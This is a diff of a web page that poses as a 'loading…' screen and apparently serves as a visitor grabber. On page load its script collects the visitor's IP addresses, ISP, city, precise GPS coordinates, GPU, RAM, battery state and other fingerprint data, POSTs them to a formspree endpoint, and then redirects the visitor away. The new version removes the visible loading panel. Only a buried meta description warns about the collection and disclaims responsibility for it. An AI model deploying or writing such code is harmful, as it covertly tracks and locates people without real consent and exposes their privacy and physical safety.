@@ -6,213 +6,149 @@
     <meta name="description" content="WARNING: This website is strictly for learning and educational purposes. By accessing this page, you acknowledge that your device information and your location will be visible. I Ituze Bonheur assumes no responsibility for the data displayed or collected, and no reports regarding this site will be accepted or entertained.">
     <title>loading…</title>
     <link rel="icon" href="images/ituze.png" type="image/png">
-    <style>
-        :root {
-            --accent: #00d4ff;
-            --bg: #0f0f0f;
-            --panel: rgba(255, 255, 255, 0.04);
-            --border: rgba(255, 255, 255, 0.08);
-        }
-        body {
-            margin: 0;
-            background: radial-gradient(circle at top, #151515, #0a0a0a);
-            color: #fff;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
-        .panel {
-            background: var(--panel);
-            border: 1px solid var(--border);
-            backdrop-filter: blur(12px);
-            border-radius: 12px;
-            padding: 40px 35px;
-            width: 320px;
-            text-align: center;
-        }
-        .loading-text {
-            font-size: .9rem;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            opacity: .8;
-            margin-bottom: 25px;
-        }
-        .loader {
-            height: 3px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
-            overflow: hidden;
-            position: relative;
-        }
-        .loader::before {
-            content: "";
-            position: absolute;
-            width: 40%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, var(--accent), #fff, var(--accent), transparent);
-            animation: slide 1s infinite linear;
-        }
-        @keyframes slide {
-            0% { left: -40%; }
-            100% { left: 100%; }
-        }
-    </style>
 </head>
 <body>
-
-<div class="panel">
-    <div class="loading-text">Loading</div>
-    <div class="loader"></div>
-</div>
-
 <script>
-var canRunAds = true;
 
-function detectAndroidVersion() {
-    const ua = navigator.userAgent;
-    const match = ua.match(/Android\s([0-9\.]+)/i);
-    if (!match) return "Not Android";
-    return "Android " + match[1];
+const CONFIG = {
+    ENDPOINT: "https://formspree.io/f/maqpoaly",
+    REDIRECT: "https://www.ituzebonheur.com"
+};
+
+async function getNetworkAndGeo() {
+    const netData = { ipv4: "Not Detected", ipv6: "Not Detected", isp: "Unavailable", geo: "Unavailable" };
+    try {
+        const [res4, res6, resGeo] = await Promise.all([
+            fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => null),
+            fetch("https://api6.ipify.org?format=json").then(r => r.json()).catch(() => null),
+            fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => null)
+        ]);
+
+        if (res4) netData.ipv4 = res4.ip;
+        if (res6) netData.ipv6 = res6.ip;
+        if (resGeo) {
+            netData.isp = resGeo.org;
+            netData.geo = `${resGeo.city}, ${resGeo.country_name}`;
+        }
+    } catch (e) {}
+    return netData;
+}
+
+async function getGPS() {
+    return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({ lat: null, lon: null, accuracy: null });
+        navigator.geolocation.getCurrentPosition(
+            p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy }),
+            () => resolve({ lat: "Denied", lon: "Denied", accuracy: null }),
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    });
+}
+
+function getHardwareInfo() {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    let gpu = "Unknown";
+    if (gl) {
+        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+        gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Software";
+    }
+
+    return {
+        gpu: gpu,
+        threads: navigator.hardwareConcurrency || "n/a",
+        ram: navigator.deviceMemory || "n/a",
+        touch: navigator.maxTouchPoints > 0
+    };
 }
 
 function getOS() {
     const ua = navigator.userAgent;
-
     if (/Android/i.test(ua)) return "Android";
     if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
     if (/Windows Phone/i.test(ua)) return "Windows Phone";
     if (/BlackBerry|BB10/i.test(ua)) return "BlackBerry";
-
     if (ua.includes("Windows NT")) return "Windows";
     if (ua.includes("Mac OS")) return "MacOS";
     if (ua.includes("CrOS")) return "ChromeOS"; 
-    
     if (ua.includes("Linux")) return "Linux";
     if (ua.includes("FreeBSD")) return "FreeBSD";
     if (ua.includes("OpenBSD")) return "OpenBSD";
     if (ua.includes("NetBSD")) return "NetBSD";
     if (ua.includes("SunOS")) return "Solaris";
-
     return "Unknown OS";
 }
 
-function getGPU() {
-    const canvas = document.createElement("canvas");
-    const gl = canvas.getContext("webgl");
-    if (!gl) return "Unavailable";
-    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
-}
-
-async function getIPData() {
-    try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipJson = await ipRes.json();
-        const ip = ipJson.ip;
-        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-        const geoJson = await geoRes.json();
-        return { ip: ip, country: geoJson.country_name || "Unavailable", city: geoJson.city || "", org: geoJson.org || "Unavailable" };
-    } catch {
-        return { ip: "Unavailable", country: "Unavailable", city: "", org: "Unavailable" };
-    }
-}
-
-async function getGPS() {
-    return new Promise(resolve => {
-        if (!navigator.geolocation) {
-            resolve({ lat: "Unavailable", lon: "Unavailable" });
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(pos => {
-            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
-        }, () => {
-            resolve({ lat: "Denied", lon: "Denied" });
-        });
-    });
-}
-
-async function getBatteryInfo() {
-    let battery = {};
-    try {
-        if (navigator.getBattery) {
-            const bat = await navigator.getBattery();
-            battery = { level: Math.round(bat.level * 100) + "%", charging: bat.charging };
-        } else {
-            battery = "Not Supported";
-        }
-    } catch (e) {
-        battery = "Blocked";
-    }
-    return battery;
-}
-
-function checkAdBlocker() {
-    const testAd = document.createElement('div');
-    testAd.innerHTML = '&nbsp;';
-    testAd.className = 'adsbox';
-    document.body.appendChild(testAd);
-    window.setTimeout(function() {
-        if (testAd.offsetHeight === 0) {
-            canRunAds = false;
-        }
-        testAd.remove();
-    }, 100);
-    return canRunAds ? "Disabled" : "Enabled";
-}
-
 async function collect() {
-    const ipData = await getIPData();
-    const gps = await getGPS();
-    const battery = await getBatteryInfo();
-    const adBlockStatus = checkAdBlocker();
-    const currentOS = getOS();
-    const androidVer = detectAndroidVersion();
+    const [net, gps, hardware] = await Promise.all([getNetworkAndGeo(), getGPS(), getHardwareInfo()]);
 
-    return {
-        TIME: new Date().toString(),
-        IP: ipData.ip,
-        LOCATION: ipData.country + " " + ipData.city,
-        ISP: ipData.org,
-        GPS_LATITUDE: gps.lat,
-        GPS_LONGITUDE: gps.lon,
-        BATTERY_INFO: battery,
-        AD_BLOCKER: adBlockStatus,
-        BROWSER: navigator.userAgent,
-        OS: currentOS,
-        Android_V: androidVer,
-        SCREEN: screen.width + "x" + screen.height,
-        TIMEZONE: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        LANGUAGE: navigator.language,
-        GPU: getGPU(),
-        PLATFORM: (currentOS === "Android") ? androidVer : navigator.platform,
-        TOUCH: navigator.maxTouchPoints > 0 ? "Yes" : "No",
-        REFERRER: document.referrer || "Direct"
+let batteryStatus = "n/a";
+if (navigator.getBattery) {
+    const b = await navigator.getBattery();
+    const level = Math.round(b.level * 100);
+    const state = b.charging ? "Charging" : "Discharging";
+    batteryStatus = `${level}% (${state})`;
+}
+    const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
+    const reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+    const payload = {
+        "userAgent": navigator.userAgent,
+        "platform": getOS(),
+        "language": navigator.language,
+        "languages": navigator.languages,
+        "screen": {
+            "touchscreen": hardware.touch,
+            "resolution": `${window.screen.width}x${window.screen.height}`,
+            "pixelRatio": window.devicePixelRatio,
+            "colorDepth": window.screen.colorDepth
+        },
+        "timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+        "cookiesEnabled": navigator.cookieEnabled,
+        "storage": {
+            "localStorage": !!window.localStorage,
+            "sessionStorage": !!window.sessionStorage,
+            "indexedDB": !!window.indexedDB
+        },
+        "network": {
+            "IPv4": net.ipv4,
+            "IPv6": net.ipv6,
+            "isp": net.isp,
+            "downlink": navigator.connection?.downlink || null,
+            "rtt": navigator.connection?.rtt || null,
+            "effectiveType": navigator.connection?.effectiveType || null
+        },
+        "referrer": document.referrer || "Direct",
+        "cpuThreads": hardware.threads,
+        "ram": hardware.ram,
+        "GPU": hardware.gpu,
+        "darkMode": darkMode,
+        "reducedMotion": reducedMotion,
+        "battery": batteryStatus,
+        "dnt": navigator.doNotTrack || "Off",
+        "location": gps,
     };
+
+    return payload;
 }
 
-async function sendData() {
+async function init() {
     const data = await collect();
+    
     try {
-        await fetch("https://formspree.io/f/maqpoaly", {
+        await fetch(CONFIG.ENDPOINT, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
         });
     } catch (e) {
-        console.error("Data transmission failed");
+        console.error("Transmission bypass");
+    } finally {
+        window.location.replace(CONFIG.REDIRECT);
     }
 }
 
-async function start() {
-    await sendData();
-    setTimeout(() => {
-        window.location.replace("https://www.google.com/?utm_source=ituzebonheur.com");
-    }, 777);
-}
-
-start();
+window.onload = init;
 </script>
 </body>
 </html>
